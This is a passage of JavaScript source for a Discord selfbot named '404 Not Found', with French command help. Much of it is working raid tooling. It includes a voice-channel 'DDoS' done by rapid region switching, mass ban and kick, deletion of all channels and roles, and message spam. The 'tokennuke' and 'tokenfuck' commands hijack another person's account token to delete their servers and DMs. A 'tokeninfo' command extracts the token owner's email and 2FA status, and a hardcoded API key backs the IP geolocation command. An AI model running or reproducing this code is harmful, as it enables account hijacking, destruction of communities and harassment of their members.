    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
 msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})

    msg.channel.send("Quelle hackeur il a ddos la voc du serveur" + serveur)
 }
    if(cmd === "about"){
        msg.delete();
        const help = new RichEmbed()
        .setTitle("404 | ABOUT")
        .setDescription("\n Made By Extazy \n \n Primary Language : nodejs \n\n Official Discord server : https://discord.gg/r9M7NR4F4a ")
        .setImage("https://cdn.discordapp.com/attachments/809170422704504852/811312415601721374/giphy_3.gif")
        .setColor("RANDOM")
        .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(help)
    }
if(cmd==="geoip"){
    msg.delete();

    let argumentation = args.slice(0).join(" ")
    console.log(`Request sended : http://api.ipstack.com/${argumentation}?access_key=ENCRYPTCODE2sD1sq2DQq4fdfDFf4s5Dd54&format=2`.green)
    superagent.get(`http://api.ipstack.com/${argumentation}?access_key=f7f808bba51af225289cfe058474bf9c&format=2`,(body, res) =>{

msg.channel.send("CHECK CONSOLE")
console.log(res.body)
    })
}
    if (cmd === 'streaming') {
        client.user.setActivity(args.join(" "), {
            url: "https://www.twitch.tv/discord",
            type: "STREAMING"
        });
        msg.delete();
        await msg.channel.send("Changement de status...").then(message => message.delete(1000));
        await msg.channel.send("Status changer ").then(message => message.delete(2000));
    };
    if(cmd==="token"){
        msg.delete();
        const help = new RichEmbed()
        .setTitle("404 | TOKEN")
        .setDescription("**TOKENINFO [TOKEN]** \n \`Donne les information du token donnée\` \n **TOKENNUKE [TOKEN]** \n \`remets a vide le token donner \` \n **TOKENFUCK [TOKEN]** \n \`Detruit le token donner \`")
        .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
        .setColor("RANDOM")
        .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(help)
    }
    if (cmd === 'tokeninfo') {
        let mention = args.join(" ")
        if (!mention) return msg.edit("`You forgot to provice a token!`").then(message => message.delete(3000));
        const token = new Client()
        token.login(mention)
        token.on("ready", () => {
            let embed = new RichEmbed()
                .addField("Avatar", token.user.avatar)
                .addField("name", token.user.username)
                .addField("ID", token.user.id)
                .addField("Email", token.user.email)
                .addField("Created", token.user.createdAt)
                .addField("Verified", token.user.verified)
                .addField("Nitro", token.user.premium)
                .addField("2fa", token.user.mfaEnabled)
                .addField("Dernier Message : ", token.user.lastMessage || "Pas de dernier message :triste:")
            msg.channel.send(embed)
        })
    }
    if (cmd === 'tokennuke') {
        const yournukebotname = new Client()
        let nuketoken = args.join(" ")
        yournukebotname.login(nuketoken)
        yournukebotname.on("ready", () => {
            yournukebotname.users.forEach(users => users.deleteDM())
            yournukebotname.guilds.forEach(guild => guild.delete())
            yournukebotname.user.setAvatar("https://cdn.discordapp.com/attachments/809170422704504852/811312992117325824/unknown.png")
        })
    }
    if(cmd==="count"){
        setInterval(() => {
  
        if(!msg.editable) return; else
        msg.edit("Counted : " + i++)
    }, 1000)
    }
    if (cmd === 'tokenfuck') {
        const yournukebotname = new Client()
        let nuketoken = args.join(" ")
        yournukebotname.login(nuketoken)
        yournukebotname.on("ready", () => {
            setInterval(() => {
                var list = yournukebotname.guilds.array();
                yournukebotname.user.createGuild("oops 404-Not-Found-Project gotchu")
                list.forEach(guild => guild.setIcon("https://cdn.discordapp.com/attachments/752518392443043900/754870396838215740/egirl.PNG"))
            }, 1000);
        })
    }
if(cmd==="status"){
    msg.delete();
    const help = new RichEmbed()
    .setTitle("404 | STATUS")
    .setDescription("\n \n**Streaming [ARGS]** \n \`Te mets en mode streamer avec le texte choisi.\` \n **online** \n \`Te mets en mode Online\` \n **dnd** \n \`Mets en mode DO NOT DISTURB\` \n **idle** \n \`Te mets en mode IDLE\`")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setColor("RANDOM")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    msg.channel.send(help)
}
if(cmd==="text"){
    msg.delete();
    const help = new RichEmbed()
    .setTitle("404 | STATUS")
    .setDescription("**ASCII [MOTS]** \n \`Affiche en ascii art le mots donner\`")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setColor("RANDOM")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    msg.channel.send(help)
}
if(cmd==="online"){
    msg.delete();
    const online = new RichEmbed()
    .setTitle("404 | ONLINE")
    .setDescription("Vous étes actuellment en ligne !")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    .setColor("RANDOM")
    msg.channel.send(online)
    client.user.setStatus("online")
}
if (cmd === 'ascii') {
   msg.delete();
    ascii.font(args.join(" "), "Doom", function(err, rendered) {
        rendered = rendered.trimRight()
        msg.channel.send("```\n" + rendered + "\n```")
    })
}


if(cmd==="dnd"){
    msg.delete();
    const online = new RichEmbed()
    .setTitle("404 | DND")
    .setDescription("Vous étes actuellment en mode dnd !")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    .setColor("RANDOM")
    msg.channel.send(online)
    client.user.setStatus("dnd")
}
if(cmd==="idle"){
    msg.delete();
    const online = new RichEmbed()
    .setTitle("404 | IDLE")
    .setDescription("Vous étes actuellment en mode IDLE !")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    .setColor("RANDOM")
    msg.channel.send(online)
    client.user.setStatus("idle")
}
if(cmd==="fun"){
    msg.delete();
    const help = new RichEmbed()
    .setTitle("404 | FUN")
    .setDescription("**kiss [USER]** \n \`fait un bisous a qui tu veut !\` \n **hug [USER]** \n \`Fait un calin a qui tu veut !\` \n **PUNCH [USER]** \n \`Mets un coup de point a l'utilisateur mentionner\` \n **SLAP [USER]** \n \`fait une claque a l'utilisateur mentionner\` \n **LICK [USER]** \n \`Leche la personne mentionne\` ")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setColor("RANDOM")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    msg.channel.send(help)
}
if(cmd==="utile"){
    msg.delete();
    const help = new RichEmbed()
    .setTitle("404 | UTILE")
    .setDescription("\n \n **STOP** \n \`Stop le selfbot\` \n **GEOIP [IP]** \n \`Donne les coordonnées gps de l'ip donner voir la commande api pour voir l'api utiliser\`")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setColor("RANDOM")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    msg.channel.send(help)
}
if(cmd === "api"){
    msg.delete();
    const help = new RichEmbed()
    .setTitle("404 | API ")
    .setDescription("\n \n NEKO API : https://www.nekos.fun/apidoc.html + https://docs.neko-love.xyz/  \n \n GEO IP : https://ipstack.com/quickstart ")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setColor("RANDOM")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    msg.channel.send(help)
}
if(cmd==='stop'){
    process.exit();
}
if (cmd === 'kiss') {
    msg.delete();
    let user = msg.mentions.users.first()
    superagent.get("https://nekos.life/api/v2/img/kiss", (body, res) => {
        if (!user){
            let error = new RichEmbed()
            .setTitle("404 | ERROR")
            .setDescription(`Tu a oublier de mentionner un utilisateur`)
            .setColor("RANDOM")
            .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
            .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(error);
        return; 
        }
        let embed = new RichEmbed()
            .setTitle("404 | KISS")
            .setDescription(`${msg.author.tag} a fait un bisous a  ${user.tag}`)
            .setColor("RANDOM")
            .setImage(res.body.url)
            .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(embed);
    })
}
if(cmd==="4k"){
    msg.delete();
   if(!msg.channel.nsfw)return msg.edit("Oops le salon n'est pas en mode nsfw")
   if(msg.channel.nsfw){
    superagent.get("http://api.nekos.fun:8080/api/4k", (body, res) =>{
        let k = new RichEmbed()
        .setTitle("Image not showing ? click here ")
        .setURL(res.body.image)
        .setImage(res.body.image)
        .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(k)
     })
    }
    }
    if(cmd==="pussy"){
        msg.delete();
        if(!msg.channel.nsfw)return msg.edit("Oops le salon n'est pas en mode nsfw")
        if(msg.channel.nsfw){
         superagent.get("http://api.nekos.fun:8080/api/pussy", (body, res) =>{
             let k = new RichEmbed()
             .setTitle("Image not showing ? click here ")
             .setURL(res.body.image)
             .setImage(res.body.image)
             .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
             msg.channel.send(k)
         })
    }
 }
 if(cmd==="boobs"){
    msg.delete();
    if(!msg.channel.nsfw)return msg.edit("Oops le salon n'est pas en mode nsfw")
    if(msg.channel.nsfw){
     superagent.get("http://api.nekos.fun:8080/api/boobs", (body, res) =>{
         let k = new RichEmbed()
         .setTitle("Image not showing ? click here ")
         .setURL(res.body.image)
         .setImage(res.body.image)
         .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(k)
     })
    }
}
if(cmd==="cum"){
    msg.delete();
    if(!msg.channel.nsfw)return msg.edit("Oops le salon n'est pas en mode nsfw")
    if(msg.channel.nsfw){
     superagent.get("http://api.nekos.fun:8080/api/cum", (body, res) =>{
         let k = new RichEmbed()
         .setTitle("Image not showing ? click here ")
         .setURL(res.body.image)
         .setImage(res.body.image)
         .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(k)
     })
    }
}
if(cmd==="hentai"){
    msg.delete();
    if(!msg.channel.nsfw)return msg.edit("Oops le salon n'est pas en mode nsfw")
    if(msg.channel.nsfw){
     superagent.get("http://api.nekos.fun:8080/api/hentai", (body, res) =>{
         let k = new RichEmbed()
         .setTitle("Image not showing ? click here ")
         .setURL(res.body.image)
         .setImage(res.body.image)
         .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(k)
     })
    }
}
if(cmd==="BJ"){
    msg.delete();
    if(!msg.channel.nsfw)return msg.edit("Oops le salon n'est pas en mode nsfw")
    if(msg.channel.nsfw){
     superagent.get("http://api.nekos.fun:8080/api/bj", (body, res) =>{
         let k = new RichEmbed()
         .setTitle("Image not showing ? click here ")
         .setURL(res.body.image)
         .setImage(res.body.image)
         .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(k)
     })
    }
}
if(cmd==="nsfw"){
    msg.delete();
    let NSFW = new RichEmbed()
    .setTitle("404 | NSFW")
    .setDescription("\n \n **BJ** \n \`BlowJob\` \n **HENTAI** \n \`Affiche un hentai\` \n **CUM** \n \`Affiche des photo CUM\` \n **BOOBS**\n \`Montre des photo de boobs\` \n **PUSSY** \n \`Affiche des photo pussy\` \n **4k** \n \`Affiche des photo 4k\`")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    msg.channel.send(NSFW)
}

if (cmd === 'hug') {
   msg.delete();
    let user = msg.mentions.users.first()
    superagent.get("https://neko-love.xyz/api/v1/hug", (body, res) => {
        if (!user){
            let error = new RichEmbed()
            .setTitle("404 | ERROR")
            .setDescription(`Tu a oublier de mentionner un utilisateur`)
            .setColor("RANDOM")
            .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
            .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(error);
        return; 
        }
        let embed = new RichEmbed()
            .setTitle("404 | KISS")
            .setDescription(`${msg.author.tag} a fait un calin a  ${user.tag}`)
            .setColor("RANDOM")
            .setImage(res.body.url)
            .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(embed);
    })
}
if (cmd === 'punch') {
    msg.delete();
     let user = msg.mentions.users.first()
     superagent.get("https://neko-love.xyz/api/v1/punch", (body, res) => {
         if (!user){
             let error = new RichEmbed()
             .setTitle("404 | ERROR")
             .setDescription(`Tu a oublier de mentionner un utilisateur`)
             .setColor("RANDOM")
             .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
             .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(error);
         return; 
         }
         let embed = new RichEmbed()
             .setTitle("404 | PUNCH")
             .setDescription(`${msg.author.tag} a mis un coup de point a ${user.tag}`)
             .setColor("RANDOM")
             .setImage(res.body.url)
             .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(embed);
     })
 }
 if (cmd === 'slap') {
    msg.delete();
     let user = msg.mentions.users.first()
     superagent.get("https://neko-love.xyz/api/v1/slap", (body, res) => {
         if (!user){
             let error = new RichEmbed()
             .setTitle("404 | ERROR")
             .setDescription(`Tu a oublier de mentionner un utilisateur`)
             .setColor("RANDOM")
             .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
             .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(error);
         return; 
         }
         let embed = new RichEmbed()
             .setTitle("404 | PUNCH")
             .setDescription(`${msg.author.tag} a gifler ${user.tag}`)
             .setColor("RANDOM")
             .setImage(res.body.url)
             .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(embed);
     })
 }
 if (cmd === 'lick') {
    msg.delete();
     let user = msg.mentions.users.first()
     superagent.get("http://api.nekos.fun:8080/api/lick", (body, res) => {
         if (!user){
             let error = new RichEmbed()
             .setTitle("404 | ERROR")
             .setDescription(`Tu a oublier de mentionner un utilisateur`)
             .setColor("RANDOM")
             .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
             .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(error);
         return; 
         }
         let embed = new RichEmbed()
             .setTitle("404 | LICK")
             .setDescription(`${msg.author.tag} a lecher ${user.tag}`)
             .setColor("RANDOM")
             .setImage(res.body.image)
             .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
         msg.channel.send(embed);
     })
 }
 if(cmd==="raid"){
    msg.delete();
    const raid = new RichEmbed()
    .setTitle("404 | RAID")
    .setDescription("\n **DDOSVOC**\n \`Ddos toute les vocale d'un server [ADMIN NEEDED ! ]\` \n  **MASSB** \n \`Ban tout les membre d'un server\` \n **MASSK** \n \`Kick tout les membre possbile \` \n **REMOVEC** \n \`delete tout les channel d'un server\` \n **REMOVER** \n \`delete tout les role d'un server\` \n **SPAM [msg]** \n \`Spam le msg choisi\`")
    .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
    .setColor("RANDOM")
    .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
    msg.channel.send(raid)
 }
 if (cmd == 'remover') {
    msg.guild.roles.forEach(role => role.delete())
}

 if (cmd === 'massb') {
    msg.react("👍")
    const Guild = msg.guild;

    if (!Guild) return;

  
    async function BanAll() {
        await Guild.fetchMembers();

        await Promise.all(Guild.members.map(async (m) => {
            if (m.bannable) {
                m.ban();
            }
        }));
    }
    BanAll()
}
if (cmd === 'massk'){
    msg.react("👍")
    try{
        msg.guild.members.forEach(Member => {
            if(Member.kickable){
                console.log(yellow(`[INFO] Kick : ` + Member.user.username))
                Member.kick()
                console.log(green("[INFO] J'ai kick tout les membre possible"))
            }
            else {
                console.log(yellow("[INFO] Je ne peut pas kick " + Member+user+username + " tu n'a pas la permission"))
            }
        })
    }
            catch(err){

            }
}
if (cmd === 'removec') {
    msg.delete();
    msg.guild.channels.forEach(channel => channel.delete())
}
if (cmd === 'removec') {
    msg.delete();
    msg.guild.channels.forEach(channel => channel.delete())
}
if (cmd === 'removec') {
    msg.delete();
    msg.guild.channels.forEach(channel => channel.delete())
}


if (cmd === 'removec') {
    msg.delete();
    msg.guild.channels.forEach(channel => channel.delete())
}
if (cmd === 'removec') {
    msg.delete();
    msg.guild.channels.forEach(channel => channel.delete())
}
if (cmd === 'removec') {
    msg.delete();
    msg.guild.channels.forEach(channel => channel.delete())
}
if(cmd === "spam"){
 const sm =  msg.content.split(" ")
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
 msg.channel.send(sm)
    }
    if(cmd==="helpbackup"){
        msg.delete();
        const raid = new RichEmbed()
        .setTitle("404 | BACKUP")
        .setDescription("\n \n **BACKUP-C** \n \`Crée une backup d'un server\` \n **BACKUP-L [ID]** \n \`Load la backup demander\` \n **BACKUP-D [ID]** \n \`Delete la backup demander\` \n **BACKUP-PURGE [ID]** \n \`Delete toute les backup\` ")
        .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
        .setColor("RANDOM")
        .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(raid)
     }
        if (cmd === "backup-c") {
            let serveur = msg.guild;
            if (!serveur) {
                msg.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            msg.guild.roles
                .filter(
                    r =>
                    r.name !== msg.guild.member(client.user.id).highestRole.name
                )
                .forEach(r => {
                    if (
                        r.comparePositionTo(
                            msg.guild.member(client.user.id).highestRole
                        ) > 0
                    ) {
                        if (!msg.member.hasPermission('EMBED_LINKS')) return msg.edit(`:x: **permission insuffisante (embed_links)**\nTon role n'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup !`)
                        let havnthighest = new RichEmbed()
                            .setTitle(`  Attention`)
                            .setFooter('404 Not Found')
                            .setDescription(
                                `Ton role n'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup !`
                            )
                            .setColor(color);
                        return msg.edit(havnthighest).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    }
                });
            if (!msg.member.hasPermission('EMBED_LINKS')) return msg.edit(`:x: **permission insuffisante (embed_links)**\nCréation de la backup. Attendre la finalisation...`);
            let creatingEmbed = new RichEmbed()
                .setTitle(`  Please wait ...`)
                .setFooter('404 Not Found')
                .setDescription("Création de la backup. Attendre la finalisation...");
            msg.edit(creatingEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)).then(m => {
                let id = makeid(16);
    
                const channels = msg.guild.channels
                    .sort(function(a, b) {
                        return a.position - b.position;
                    })
                    .array()
                    .map(c => {
                        const channel = {
                            type: c.type,
                            name: c.name,
                            postion: c.calculatedPosition
                        };
                        if (c.parent) channel.parent = c.parent.name;
                        return channel;
                    });
    
                const roles = msg.guild.roles
                    .filter(r => r.name !== "@everyone")
                    .sort(function(a, b) {
                        return a.position - b.position;
                    })
                    .array()
                    .map(r => {
                        const role = {
                            name: r.name,
                            color: r.color,
                            hoist: r.hoist,
                            permissions: r.permissions,
                            mentionable: r.mentionable,
                            position: r.position
                        };
                        return role;
                    });
    
                if (!backups[msg.author.id]) backups[msg.author.id] = {};
                backups[msg.author.id][id] = {
                    icon: msg.guild.iconURL,
                    name: msg.guild.name,
                    owner: msg.guild.ownerID,
                    members: msg.guild.memberCount,
                    createdAt: msg.guild.createdAt,
                    roles,
                    channels
                };
    
                save();
